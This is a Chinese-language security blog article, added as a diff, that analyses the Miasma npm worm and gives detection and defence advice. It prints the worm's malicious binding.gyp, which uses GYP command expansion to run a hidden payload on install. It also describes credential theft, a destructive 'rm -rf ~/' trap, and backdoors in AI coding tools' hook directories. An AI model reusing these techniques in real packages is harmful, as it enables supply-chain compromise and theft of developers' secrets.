@@ -1,0 +1,257 @@
+---
+title: "Miasma 蠕虫深度剖析：当供应链攻击开始瞄准 AI 编码 Agent"
+description: "Miasma 蠕虫在 2 小时内感染 57 个 npm 包、286 个恶意版本，首次将 AI 编码助手（Claude、Cursor、Gemini）的配置目录作为持久化攻击面。本文完整还原攻击链并分析防御策略"
+column: "long-form"
+tags: ["供应链安全", "Miasma", "npm", "AI安全", "供应链攻击", "编码Agent"]
+pubDate: 2026-06-12
+featured: false
+tldr: "Miasma 蠕虫利用 npm 的 binding.gyp 自动编译机制绕过所有 postinstall 监控，在 2 小时内感染 57 个包。更危险的是它首次将 Claude、Cursor 等 AI 编码助手的配置目录作为后门植入点，让恶意代码在开发者使用 AI 工具时自动执行"
+author: "YOMXXX"
+faq:
+  - q: "Miasma 蠕虫是什么？"
+    a: "Miasma 是一个自传播的 npm 供应链蠕虫，通过劫持维护者账号发布恶意版本，利用 binding.gyp 文件在 npm install 时执行恶意代码，窃取凭据后自动感染受害者维护的其他包"
+  - q: "binding.gyp 攻击为什么能绕过安全工具？"
+    a: "传统安全工具只检查 package.json 中的 lifecycle scripts（preinstall、postinstall 等），而 binding.gyp 是 node-gyp 编译系统的入口，走完全不同的代码路径。即使使用 --ignore-scripts 也无法阻止"
+  - q: "AI 编码助手被攻击意味着什么？"
+    a: "Miasma 在 Claude、Cursor、Gemini 的配置目录中植入后门文件。开发者即使清除了恶意包，下次用这些 AI 工具打开项目时后门仍会执行，相当于把 AI 编码流程变成了攻击的持久化通道"
+  - q: "普通开发者如何检查自己是否受影响？"
+    a: "检查 node_modules 中是否有异常的 binding.gyp 文件（grep -r '<!(' node_modules/），检查 ~/.claude/ 和 Cursor 配置目录是否有未知文件，检查 /tmp 下是否有 bun 二进制文件"
+  - q: "如何防范类似的供应链攻击？"
+    a: "启用 npm 账号的双因素认证、锁定依赖版本并验证哈希、扫描 binding.gyp 中的命令扩展语法、监控异常大小的 JavaScript 文件、在 CI 环境中限制网络出站访问"
+---
+
+> **一句话总结**：Miasma 不只是又一个 npm 供应链攻击——它是第一个专门针对 AI 编码 Agent 生态的自传播蠕虫，把 Claude、Cursor、Gemini 的配置目录变成了持久化后门入口。
+
+## 事件时间线
+
+2026 年 6 月 1 日至 7 日，npm 生态遭遇了迄今为止最复杂的供应链蠕虫攻击之一。以下是完整时间线：
+
+| 日期 | 事件 |
+|------|------|
+| 2025 年 9 月 | Shai-Hulud / Miasma 攻击谱系首次出现 |
+| 2026 年 5 月 12 日 | TeamPCP 公开发布了完整的 Shai-Hulud 源代码 |
+| 6 月 1 日 | Wave 1：32 个 `@redhat-cloud-services` 包被注入恶意 preinstall 脚本 |
+| 6 月 3 日 23:30 UTC | Wave 2 开始：4 个恶意版本的 `@vapi-ai/server-sdk` 被发布 |
+| 6 月 4 日 00:30 UTC | 攻击者转向 `jagreehal` 账号，开始感染 50+ 个包 |
+| 6 月 4 日 01:30 UTC | Wave 2 完成——从开始到结束不到 2 小时 |
+| 6 月 4 日 05:29 UTC | 安全团队开始封锁恶意版本 |
+| 6 月 5 日 | Wave 3：Microsoft Azure/durabletask 仓库被植入恶意 commit |
+| 6 月 7 日 | 73 个 Microsoft GitHub 仓库被禁用 |
+
+这是 Shai-Hulud / Miasma 谱系中的**第八次**独立攻击事件。
+
+## 攻击链完整还原
+
+### 第一步：账号劫持
+
+攻击者至少劫持了两个 npm 维护者账号：
+- 一个控制 `@vapi-ai` 作用域（server-sdk 月下载量约 40.8 万）
+- 另一个（`jagreehal`）维护着 autotel、awaitly、executable-stories 等 50+ 个包
+
+账号劫持的具体方式未公开，但结合 Wave 1 中 RedHat 账号的被入侵，推测与凭据重用或 token 泄露有关。
+
+### 第二步：Phantom Gyp——绕过一切 postinstall 监控
+
+这是 Miasma 最关键的技术创新，也是理解整个攻击的核心。
+
+**背景知识**：npm 的安全工具通常通过检查 `package.json` 中的 lifecycle scripts 字段（`preinstall`、`install`、`postinstall`、`prepare`）来发现安装时代码执行。许多组织用 `--ignore-scripts` 来禁止这些脚本运行。
+
+**绕过方式**：npm 有一个独立的代码路径——当包中存在 `binding.gyp` 文件时，npm 会**自动调用 node-gyp** 来编译原生扩展。这个调用与 lifecycle scripts 走的是完全不同的代码逻辑。
+
+Miasma 的恶意 `binding.gyp` 只有 157 字节：
+
+```json
+{
+  "targets": [{
+    "target_name": "stub",
+    "type": "none",
+    "actions": [{
+      "action_name": "run",
+      "inputs": [],
+      "outputs": ["<!(node index.js > /dev/null && echo stub.c)"]
+    }]
+  }]
+}
+```
+
+关键在 `outputs` 字段的 `<!(...)` 语法——这是 GYP 的命令扩展，会在 configure 阶段执行 shell 命令。`type: "none"` 意味着不会真正编译任何东西，`node index.js` 在后台静默执行，`echo stub.c` 让 gyp 正常退出。
+
+**为什么这招如此致命**：
+- `package.json` 中没有任何异常——不包含 `preinstall`、`postinstall` 等字段
+- 包甚至没有声明 `"gypfile": true`
+- 静态分析工具扫描 `package.json` 什么都发现不了
+- `--ignore-scripts` 无法阻止 node-gyp 调用（不同代码路径）
+- npm audit 不会标记 `binding.gyp` 文件
+
+### 第三步：三阶段载荷
+
+一旦 `node index.js` 被执行，攻击进入载荷投递阶段。
+
+**阶段 1：混淆加载器**
+
+根级 `index.js` 文件大小在 4.5-4.9 MB——对于一个 JavaScript 入口文件来说异常巨大。代码混淆方式是将一个约 130 万元素的字符编码数组包在 ROT-14 凯撒密码和 `eval()` 中。解码后，使用 AES-128-GCM 解密两个嵌入的密文块。
+
+```
+已知 AES-128-GCM 密钥：
+- fe0d71d57ecf4fa0a433185bf59a03f5
+- f5e5dca9b725ec18514c4b322ed35d2b
+```
+
+**阶段 2：Bun 运行时下载**
+
+第一个解密块检测操作系统和架构，从 GitHub 官方 Bun 发布页下载 Bun v1.3.13 独立二进制文件到临时目录。第二个解密块（实际恶意载荷）在 Bun 进程下运行。
+
+这是刻意的规避策略——**监控工具如果只关注 Node.js 子进程，完全看不到 Bun 进程**。而且 `index.js` 的明文中不包含任何凭据字符串或 C2 地址，所有行为逻辑都在 Bun 执行的密文块中。
+
+**阶段 3：CI/CD 蠕虫载荷（约 720KB）**
+
+Bun 开始执行后，四个核心操作并行启动。
+
+### 第四步：全方位凭据窃取
+
+Miasma 的凭据扫描范围之广令人咋舌：
+
+| 类别 | 目标 |
+|------|------|
+| **npm** | `~/.npmrc`、`NPM_TOKEN` 环境变量 |
+| **GitHub** | `GITHUB_TOKEN`、PAT、`~/.config/gh/hosts.yml` |
+| **CI Runner** | 直接读取 `/proc/mem` 提取 runner 进程中的明文密钥，**绕过 CI 密钥遮掩** |
+| **AWS** | Access Key + IMDSv2 元数据端点 |
+| **GCP** | 服务账号凭据 |
+| **Azure** | Client Secret + Key Vault 内容 |
+| **Kubernetes** | 服务账号 Token |
+| **SSH** | 私钥文件 |
+| **密码管理器** | 1Password CLI、gopass、pass |
+
+特别注意 CI Runner 凭据的窃取方式——通过读取 `/proc/mem` 直接从 runner 工作进程的内存中提取密钥明文，完全绕过 CI 平台的密钥遮掩机制。
+
+### 第五步：隐蔽数据外传
+
+窃取的数据用硬编码的 RSA 公钥加密，发送到攻击者控制的 GitHub 仓库（账号 `liuende501`，236 个仓库）。仓库命名模式为 `nemean-hydra-NNNNN`。
+
+外传方式极其巧妙——凭据以加密 JSON 文件上传到 `results/` 目录，使用**悬空 commit**（dangling commits，不可从任何分支到达），在正常的仓库浏览中完全不可见。
+
+### 第六步：自传播——从 1 个包到 57 个包
+
+这是 Miasma 的蠕虫特性：
+
+1. 用窃取到的 npm token 查询受害者维护的所有包
+2. 下载每个包的 tarball
+3. 注入恶意载荷（`binding.gyp` + 混淆 `index.js`）
+4. 发布递增版本号的新版本
+
+这就是一个被劫持的账号如何在 2 小时内变成 57 个被感染的包。
+
+### 第七步：GitHub Actions 注入
+
+使用窃取的 GitHub token，蠕虫通过 `createCommitOnBranch` GraphQL mutation 修改 CI 工作流 YAML 文件。这种方式产生的是**经过验证的签名 commit**，注入一个 `setup-bun` 步骤和载荷执行步骤。结果是：蠕虫会在受害者可推送的**每个仓库的每次 CI 作业中**运行。
+
+## 最危险的升级：瞄准 AI 编码助手
+
+这是 Miasma Phantom Gyp 变体中最令人警觉的新特性。
+
+蠕虫在以下 AI 编码工具的配置目录中植入持久化后门文件：
+
+- **Anthropic Claude**：`~/.claude/` hooks 目录
+- **Cursor AI**：配置目录
+- **Google Gemini**：配置目录
+
+这意味着什么？
+
+1. 开发者执行 `npm install` 感染恶意包
+2. 蠕虫在 AI 工具配置目录中植入后门
+3. 开发者发现问题，删除恶意包，清理 `node_modules`
+4. **下次开发者用 Claude Code 或 Cursor 打开任何项目时，后门再次执行**
+
+攻击者将 AI 辅助开发工作流本身变成了攻击的持久化和传播面。更可怕的是，被后门劫持的 AI 工具可能会在生成的代码中静默注入恶意逻辑，而开发者因为信任 AI 的输出很可能不会逐行审查。
+
+### 反分析陷阱
+
+Miasma 还设置了一个诱饵 token 并监控其活动。如果诱饵被触碰（比如安全分析人员尝试使用它），会触发 `rm -rf ~/`——清除受害者的整个主目录。这是一个反分析和反修复陷阱。
+
+## 攻击面分析
+
+### 为什么 npm 特别脆弱
+
+npm 生态的几个结构性特点让它成为供应链攻击的温床：
+
+1. **自动执行**：`npm install` 默认执行 lifecycle scripts 和 node-gyp 编译
+2. **依赖深度**：典型项目有数百个传递依赖，每个都可能是攻击入口
+3. **维护者账号安全**：大量维护者未启用 2FA
+4. **版本发布无审核**：任何拥有 publish 权限的人可以随时发布新版本
+
+### 为什么 AI 编码工具成为目标
+
+AI 编码助手的配置目录是一个理想的持久化位置：
+
+1. **跨项目生效**：不同于 `node_modules` 是项目级的，AI 工具配置是用户级的
+2. **自动执行**：hooks 和插件在工具启动时自动加载
+3. **信任链**：开发者通常不会审查 AI 工具的配置文件
+4. **传播放大**：被劫持的 AI 工具在生成代码时可以注入恶意逻辑
+
+## 防御指南
+
+### 紧急响应（如果你可能已感染）
+
+**重要：先断网再操作**。Miasma 的诱饵 token 陷阱意味着贸然行动可能触发数据销毁。
+
+1. 从**干净设备**轮换所有凭据（按优先级）：GitHub Token → npm Token → AWS 密钥 → GCP 服务账号 → Azure 密钥 → SSH 密钥
+
+2. 审计所有可写仓库的 GitHub Actions 工作流，查找异常的 `setup-bun` 步骤
+
+3. 检查 6 月 3-4 日窗口内的异常 npm 发布
+
+4. 检查 AI 工具配置目录：
+```bash
+ls -la ~/.claude/
+ls -la ~/.cursor/
+find /tmp -name "bun*" -type f
+find ./node_modules -name "binding.gyp" -exec grep -l '<!\(' {} \;
+```
+
+### 长期防御措施
+
+| 措施 | 说明 |
+|------|------|
+| npm 账号 2FA | 所有有 publish 权限的账号必须启用 |
+| 锁定依赖版本 | 使用 `package-lock.json` 并验证哈希 |
+| 扫描 `binding.gyp` | CI 中检查 `binding.gyp` 是否包含 `<!(` 命令扩展 |
+| 监控异常文件大小 | `index.js` 超过 1MB 应该触发告警 |
+| CI 网络隔离 | 限制 CI 环境的出站网络访问 |
+| 审查 AI 工具配置 | 定期检查 `~/.claude/`、`~/.cursor/` 等目录 |
+
+### 安全版本锁定
+
+如果你使用了受影响的包：
+- `@vapi-ai/server-sdk`：锁定到 `0.11.0` 或更早
+- `ai-sdk-ollama`：锁定到 `0.13.0` 或更早
+- `autotel` 系列：锁定到 `3.4.2` 或更早
+
+**注意**：即使 `latest` 标签已被修正，部分恶意版本的 tarball 仍然存在于 `registry.npmjs.org` 上。使用 lockfile 锁定特定版本号的项目如果恰好锁到恶意版本，仍会拉取到恶意代码。
+
+## IoC（入侵指标）
+
+| 类型 | 指标 |
+|------|------|
+| GitHub 账号 | `liuende501`（236 个仓库） |
+| 仓库命名模式 | `nemean-hydra-NNNNN` |
+| 仓库描述 | `Miasma - The Spreading Blight` |
+| C2 信标 | GitHub commit 搜索 `thebeautifulmarchoftime` |
+| 网络 C2 | `t.m-kosche[.]com`（伪装为 OpenTelemetry trace 端点） |
+| 文件特征 | `/tmp/bun` 或 `/tmp/bun-XXXXXX`（Bun v1.3.13） |
+| User-Agent | `python-requests/2.31.0` |
+
+## 供应链安全的结构性困境
+
+Miasma 暴露了一个深层问题：**每一波 Miasma 攻击都专门针对上一波防御措施做了规避**。
+
+Wave 1 用 `preinstall` 脚本，安全工具开始扫描 lifecycle scripts。Wave 2 改用 `binding.gyp`，绕过所有基于 `package.json` 的检测。当社区开始扫描 `binding.gyp` 时，下一波可能会找到新的执行路径。
+
+这是攻防对抗的典型动态。封锁名单和扫描器天然有**时间差**——在 Miasma 的 2 小时攻击窗口内，大部分工具还没来得及更新规则。
+
+长期来看，结构性解决方案可能需要：
+- npm 对 `binding.gyp` 的自动 node-gyp 调用增加显式确认
+- 包注册表对发布版本实施延迟生效和自动扫描
+- AI 编码工具的配置目录增加完整性校验和沙箱隔离
+
+Miasma 的最大警示不是某个具体的漏洞利用——而是**当 AI 编码助手成为开发者日常工作流的核心时，它们的配置和信任机制也成了高价值攻击目标**。这个趋势只会加速。
